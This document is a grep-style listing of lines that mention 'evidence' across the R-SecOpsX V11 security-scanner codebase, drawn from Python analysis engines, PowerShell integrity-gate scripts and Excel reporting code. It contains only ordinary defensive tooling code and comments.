+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\runtime_artifact_integrity_engine.py:253 | # Source-code SAST findings are not runtime artifact evidence. In
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\runtime_artifact_integrity_engine.py:256 | # same text. Runtime artifact evidence comes from artifact/package/ABOM
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\secret_blast_radius_correlation_engine.py:101 | str(finding.get("evidence", "")),
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\secret_blast_radius_correlation_engine.py:182 | evidence: Dict[str, Any],
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\secret_blast_radius_correlation_engine.py:190 | secret_confirmed = bool(evidence.get("secret_confirmed") is True or evidence.get("validated_live") is True)
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\secret_blast_radius_correlation_engine.py:191 | provider_scope_confirmed = bool(evidence.get("provider_scope_confirmed") is True or evidence.get("scope_confirmed") is True)
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\secret_blast_radius_correlation_engine.py:214 | "evidence": evidence or {},
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\secret_live_validation_engine.py:55 | evidence: str
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\secret_live_validation_engine.py:135 | for key in ("snippet", "evidence", "description"):
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\secret_live_validation_engine.py:317 | evidence="No safe standard-library live validator available for this secret type",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\secret_live_validation_engine.py:344 | "evidence": "Non-dict finding supplied",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\secret_live_validation_engine.py:364 | evidence="Finding does not expose raw secret value to validator",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\secret_live_validation_engine.py:376 | "evidence": result.evidence,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\secret_live_validation_engine.py:471 | "evidence": type(exc).__name__,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\security_control_coverage_engine.py:90 | Convert structured evidence to searchable text without allowing a
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\security_control_coverage_engine.py:158 | str(finding.get("evidence", "")),
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\security_control_coverage_engine.py:195 | evidence: Dict[str, Any],
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\security_control_coverage_engine.py:223 | "evidence_match": match.group(0)[:160],
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\security_control_coverage_engine.py:224 | "evidence": evidence or {},
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\security_control_coverage_engine.py:250 | "evidence_match": None,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\security_control_coverage_engine.py:251 | "evidence": {
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\security_control_coverage_engine.py:252 | "note": "Control was not observed in available static evidence. This is not proof the control is absent.",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\security_control_coverage_engine.py:323 | evidence={
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\security_control_coverage_engine.py:342 | evidence={
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\security_control_coverage_engine.py:353 | evidence={
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\security_control_coverage_engine.py:368 | evidence={
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\security_control_coverage_engine.py:388 | evidence={
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\security_control_coverage_engine.py:393 | # CBOM evidence is cryptographic by definition; evaluate only the
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\security_control_coverage_engine.py:405 | evidence={
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\supply_chain_trust_engine.py:56 | "evidence_match": name,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\supply_chain_trust_engine.py:57 | # Static trust-pattern evidence is a review signal, not proof
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\supply_chain_trust_engine.py:168 | "evidence_match": str(version),
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\supply_chain_trust_engine.py:177 | "evidence_match": str(
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\supply_chain_trust_engine.py:191 | # indicators on the same package remain available as evidence but do
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\supply_chain_trust_engine.py:237 | "evidence": [i.get("evidence_match") for i in indicators],
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\supply_chain_trust_engine.py:240 | "governance_semantics": "STATIC_SUPPLY_CHAIN_EVIDENCE_REQUIRES_SEPARATE_EXECUTIVE_CONFIRMATION",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\config\analysis_context.yaml:63 | preserve_evidence: true
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\analyzer.py:50 | # Preserve occurrence-local security evidence. Grouping must never
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\analyzer.py:55 | "evidence_valid": f.get("evidence_valid"),
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\analyzer.py:311 | Issue 6 FIX: derive exploitability from taint evidence, EPSS, and context.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\analyzer.py:336 | Determine exploitability based on evidence quality:
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\analyzer.py:339 | LOW    — pattern match only, no user-input evidence
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\analyzer.py:536 | # Canonical evidence-integrity gate. Once EVIDEX says the evidence is
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\analyzer.py:540 | if f.get("evidence_valid") is False:
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\analyzer.py:543 | # Heuristic path-traversal evidence must not claim a concrete filesystem
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\analyzer.py:556 | ctx = " ".join(str(f.get(k, "")) for k in ("file", "snippet", "description", "evidence")).lower()
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\analyzer.py:613 | _ev = int(f.get("evidence_score") or f.get("evidence_quality") or 0)
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\analyzer.py:614 | _taint_ok = bool(f.get("taint_validated") or f.get("evidence_validation_detail", {}).get("taint_validated"))
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\analyzer.py:615 | _sink_ok = bool(f.get("sink_validated") or f.get("evidence_validation_detail", {}).get("sink_valid"))
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\analyzer.py:616 | _static_text = " ".join(str(f.get(k) or "") for k in ("snippet", "evidence", "description")).lower()
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\analyzer.py:627 | # Deterministic static evidence: an actual PEM private-key block is HIGH
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\analyzer.py:631 | f["evidence_confidence"] = "HIGH"
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\attack_graph.py:254 | VAL-009 FIX: each path is labelled with its evidence_type:
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\attack_graph.py:262 | # Evidence semantics: only explicit AST/data-flow evidence may establish a
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\attack_graph.py:264 | # for reachability evidence. Pattern/heuristic findings remain candidates.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\attack_graph.py:271 | or bool((f.get("evidence_validation_detail") or {}).get("taint_validated"))
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\attack_graph.py:272 | or str(f.get("evidence_type", "")).lower() in {"taint-confirmed", "taint_validated"}
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\attack_graph.py:293 | # Evidence-aware path classification. A pattern finding is a candidate
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\attack_graph.py:296 | evidence_type = "taint-confirmed" if is_taint else "pattern-detected"
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\attack_graph.py:297 | evidence_note = (
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\attack_graph.py:339 | "evidence_type": evidence_type,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\attack_graph.py:340 | "evidence_note": evidence_note,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\benchmark_evidence_validation_v1.py:6 | MODULE = Path(__file__).with_name("analyzer_evidence_hardened_v1.py")
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\benchmark_evidence_validation_v1.py:8 | spec = importlib.util.spec_from_file_location("analyzer_evidence_hardened_v1", MODULE)
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\benchmark_evidence_validation_v1.py:60 | print("R-SecOpsX EVIDENCE / SINK VALIDATION BENCHMARK v1")
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\benchmark_evidence_validation_v1.py:64 | valid, reason, quality = mod._validate_security_evidence(finding)
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\deduplicator.py:104 | "evidence_valid": None,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\deduplicator.py:133 | "evidence_valid",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\finding_model.py:22 | isinstance(f.get('evidence_validation_detail'), dict)
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\finding_model.py:23 | and f['evidence_validation_detail'].get('taint_validated')
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\finding_model.py:29 | isinstance(f.get('evidence_validation_detail'), dict)
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\finding_model.py:30 | and f['evidence_validation_detail'].get('sink_valid') is True
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\finding_model.py:36 | and bool(f.get('evidence_valid', True))
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\finding_model.py:42 | if f.get('evidence_valid') is False:
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\finding_model.py:50 | ev = f.get('evidence_valid')
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\finding_model.py:60 | f.setdefault('evidence_state', 'validated' if ev is not False else 'invalid')
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\idor analyzer.py:213 | Issue 6 FIX: derive exploitability from taint evidence, EPSS, and context.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\idor analyzer.py:238 | Determine exploitability based on evidence quality:
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\idor analyzer.py:241 | LOW    — pattern match only, no user-input evidence
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\idoranalyzer.py:230 | Issue 6 FIX: derive exploitability from taint evidence, EPSS, and context.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\idoranalyzer.py:255 | Determine exploitability based on evidence quality:
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\idoranalyzer.py:258 | LOW    — pattern match only, no user-input evidence
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\rule_contract.py:44 | "evidence": (
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\rule_contract.py:45 | "evidence_requirements",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\rule_contract.py:46 | "required_evidence",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\rule_contract.py:47 | "evidence_types",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\rule_contract.py:69 | "evidence": {},
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\rule_contract_adapter.py:88 | def _evidence_types(finding: dict[str, Any]) -> list[str]:
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\rule_contract_adapter.py:89 | explicit = finding.get("evidence_types")
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\rule_contract_adapter.py:96 | if finding.get("evidence"):
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\rule_contract_adapter.py:97 | types.append("CODE_EVIDENCE")
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\rule_contract_adapter.py:111 | if finding.get("evidence_valid") is not None:
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\rule_contract_adapter.py:112 | types.append("EVIDENCE_VALIDATION")
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\rule_contract_adapter.py:130 | "evidence_source",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\rule_contract_adapter.py:174 | - does not manufacture security evidence
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\rule_contract_adapter.py:220 | evidence = {
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\rule_contract_adapter.py:221 | "evidence_requirements": f.get("evidence_requirements"),
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\rule_contract_adapter.py:222 | "required_evidence": f.get("required_evidence"),
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\rule_contract_adapter.py:223 | "evidence_types": _evidence_types(f),
+[Evidence] D:\data\Code test\r-SecOpsX_V11\core\rule_contract_adapter.py:238 | f["rule_evidence"] = evidence
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate.ps1:24 | [string]$Evidence
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate.ps1:30 | Evidence = $Evidence
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate.ps1:33 | Write-Host ('[{0}] {1} - {2}' -f $Status, $Check, $Evidence)
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate.ps1:145 | Add-Result 'Production call-chain source evidence' 'PASS' 'Expected main -> SAST -> taint source symbols present'
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate.ps1:147 | Add-Result 'Production call-chain source evidence' 'REVIEW_REQUIRED' 'Expected source-chain symbols were not all found'
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate.ps1:184 | # 9. Existing validation evidence discovery
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate.ps1:185 | $EvidenceFiles = @()
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate.ps1:189 | $EvidenceFiles += Get-ChildItem $SearchRoot -Recurse -File -ErrorAction SilentlyContinue |
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate.ps1:197 | if ($EvidenceFiles.Count -gt 0) {
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate.ps1:198 | Add-Result 'Existing validation evidence discovery' 'PASS' ($EvidenceFiles.Count.ToString() + ' candidate evidence files found')
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate.ps1:200 | Add-Result 'Existing validation evidence discovery' 'REVIEW_REQUIRED' 'No candidate evidence files found'
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate_CLEAN.ps1:24 | [string]$Evidence
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate_CLEAN.ps1:30 | Evidence = $Evidence
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate_CLEAN.ps1:33 | Write-Host ('[{0}] {1} - {2}' -f $Status, $Check, $Evidence)
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate_CLEAN.ps1:145 | Add-Result 'Production call-chain source evidence' 'PASS' 'Expected main -> SAST -> taint source symbols present'
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate_CLEAN.ps1:147 | Add-Result 'Production call-chain source evidence' 'REVIEW_REQUIRED' 'Expected source-chain symbols were not all found'
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate_CLEAN.ps1:184 | # 9. Existing validation evidence discovery
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate_CLEAN.ps1:185 | $EvidenceFiles = @()
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate_CLEAN.ps1:189 | $EvidenceFiles += Get-ChildItem $SearchRoot -Recurse -File -ErrorAction SilentlyContinue |
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate_CLEAN.ps1:197 | if ($EvidenceFiles.Count -gt 0) {
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate_CLEAN.ps1:198 | Add-Result 'Existing validation evidence discovery' 'PASS' ($EvidenceFiles.Count.ToString() + ' candidate evidence files found')
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate_CLEAN.ps1:200 | Add-Result 'Existing validation evidence discovery' 'REVIEW_REQUIRED' 'No candidate evidence files found'
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate_FINAL.ps1:30 | [string]$Evidence
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate_FINAL.ps1:35 | Evidence = $Evidence
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate_FINAL.ps1:37 | Write-Host ("[{0}] {1} - {2}" -f $Status, $Check, $Evidence)
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate_FINAL.ps1:138 | # 6. Production call-chain source evidence
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate_FINAL.ps1:153 | Add-Result 'Production call-chain source evidence' 'PASS' 'main.py -> scanner.sast -> taint_engine.analyze_file is represented in source'
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate_FINAL.ps1:155 | Add-Result 'Production call-chain source evidence' 'REVIEW_REQUIRED' 'One or more source links were not established by static inspection'
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate_FINAL.ps1:159 | # 7. Secret Intelligence closure evidence
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate_FINAL.ps1:174 | # 8. Search for prior closure/validation evidence
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate_FINAL.ps1:192 | Add-Result "Existing validation evidence discovery" "PASS" "$($closureMatches.Count) candidate evidence/artifact files found"
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate_FINAL.ps1:193 | $closureMatches | Select-Object -First 50 FullName | ForEach-Object { Write-Host "  EVIDENCE: $($_.FullName)" }
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate_FINAL.ps1:195 | Add-Result "Existing validation evidence discovery" "REVIEW_REQUIRED" "No candidate validation evidence found in preferred V11 working locations"
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate_FINAL.ps1:283 | Write-Host "V11 baseline may be frozen before Evidence Schema implementation.""
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate_FIXED.ps1:30 | [string]$Evidence
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate_FIXED.ps1:35 | Evidence = $Evidence
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate_FIXED.ps1:37 | Write-Host ("[{0}] {1} - {2}" -f $Status, $Check, $Evidence)
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate_FIXED.ps1:138 | # 6. Production call-chain source evidence
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate_FIXED.ps1:153 | Add-Result 'Production call-chain source evidence' 'PASS' 'main.py -> scanner.sast -> taint_engine.analyze_file is represented in source'
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate_FIXED.ps1:155 | Add-Result 'Production call-chain source evidence' 'REVIEW_REQUIRED' 'One or more source links were not established by static inspection'
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate_FIXED.ps1:159 | # 7. Secret Intelligence closure evidence
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate_FIXED.ps1:174 | # 8. Search for prior closure/validation evidence
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate_FIXED.ps1:192 | Add-Result "Existing validation evidence discovery" "PASS" "$($closureMatches.Count) candidate evidence/artifact files found"
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate_FIXED.ps1:193 | $closureMatches | Select-Object -First 50 FullName | ForEach-Object { Write-Host "  EVIDENCE: $($_.FullName)" }
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate_FIXED.ps1:195 | Add-Result "Existing validation evidence discovery" "REVIEW_REQUIRED" "No candidate validation evidence found in preferred V11 working locations"
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate_FIXED.ps1:283 | Write-Host "V11 baseline may be frozen before Evidence Schema implementation.""
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:9 | # D:\data\Code test\r-SecOpsX_V11\Working folder\Evidence_Schema_Discovery
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:14 | $OutputDir = Join-Path $Root 'Working folder\Evidence_Schema_Discovery'
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:34 | [string]$Evidence
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:41 | Evidence = $Evidence
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:57 | $_.FullName -notlike ($Root + '\Working folder\Evidence_Schema_Discovery\*') -and
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:79 | # 2. Search for exact 12-test evidence and likely test-count expressions
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:99 | Write-Host '--- Exact / near-exact 12-test evidence ---'
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:107 | Add-Row 'TestCountEvidence' $Match.Path $Pattern ('Line ' + $Match.LineNumber + ': ' + $Match.Line.Trim())
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:137 | # 4. Discover evidence contract fields in tests/config
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:138 | $EvidencePatterns = @(
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:139 | 'evidence_id',
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:147 | 'Evidence',
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:148 | 'QualifiedEvidence',
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:149 | 'EvidenceProvenance'
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:153 | Write-Host '--- Evidence contract references in test/config files ---'
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1:1 | # R-SecOpsX V11 - Evidence Schema Discovery Gate
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1:9 | # D:\data\Code test\R-SecOpsX_V11\Working folder\Evidence_Schema_Discovery
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1:14 | $OutputDir = Join-Path $Root 'Working folder\Evidence_Schema_Discovery'
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1:24 | $Report = Join-Path $OutputDir ('V11_Evidence_Schema_Discovery_' + $Stamp + '.txt')
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1:25 | $Csv = Join-Path $OutputDir ('V11_Evidence_Schema_Discovery_' + $Stamp + '.csv')
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1:34 | [string]$Evidence
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1:41 | Evidence = $Evidence
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1:49 | Write-Host ' R-SecOpsX V11 - EVIDENCE SCHEMA DISCOVERY GATE'
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1:66 | # Candidate evidence-related source files
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1:67 | $EvidenceFiles = $PythonFiles |
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1:69 | $_.Name -match 'evidence|schema|graph|attack|provenance|confidence|finding|risk|decision|rcmsp'
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1:73 | Write-Host '--- Evidence/schema/graph candidate source files ---'
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1:75 | foreach ($File in $EvidenceFiles) {
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1:77 | Add-Row 'EvidenceCandidate' $File.FullName 'Candidate source file' ''
+[Evidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1:116 | # Search source/test/configuration content for established V11 evidence vocabulary.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\reporting\cyclonedx_export.py:403 | "name": "rsecopsx:dependency_graph_evidence",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\reporting\excel_report.py:293 | text = " ".join(str(item.get(k, "")) for k in ("title", "vuln_type", "description", "snippet", "evidence")).lower()
+[Evidence] D:\data\Code test\r-SecOpsX_V11\reporting\excel_report.py:308 | def _evidence_confidence(item: dict) -> str:
+[Evidence] D:\data\Code test\r-SecOpsX_V11\reporting\excel_report.py:310 | if item.get("correlation_evidence") or item.get("blast_radius") or item.get("chains_to"): return "Correlated"
+[Evidence] D:\data\Code test\r-SecOpsX_V11\reporting\excel_report.py:574 | "Confidence", "Evidence Confidence", "Data Classification", "Detection Source", "Engine Name",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\reporting\excel_report.py:576 | "Benchmark Disposition", "Evidence Qualification",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\reporting\excel_report.py:632 | _evidence_confidence(f),
+[Evidence] D:\data\Code test\r-SecOpsX_V11\reporting\excel_report.py:642 | f.get("evidence_qualification") or "--",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\reporting\excel_report.py:779 | headers = ["Type", "Rule ID", "Severity", "File", "Line", "Finding", "Evidence", "Remediation"]
+[Evidence] D:\data\Code test\r-SecOpsX_V11\reporting\excel_report.py:804 | f.get("evidence") or f.get("snippet") or "",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\reporting\excel_report.py:817 | "License Category","Resolution Status","Evidence Source",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\reporting\excel_report.py:818 | "Evidence","Review Status","Provenance",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\reporting\excel_report.py:825 | _title_row(ws, "LICENSE EVIDENCE / IP POLICY DETAILS", len(headers))
+[Evidence] D:\data\Code test\r-SecOpsX_V11\reporting\excel_report.py:828 | summary=payload.get("license_evidence_summary",{}) or {}
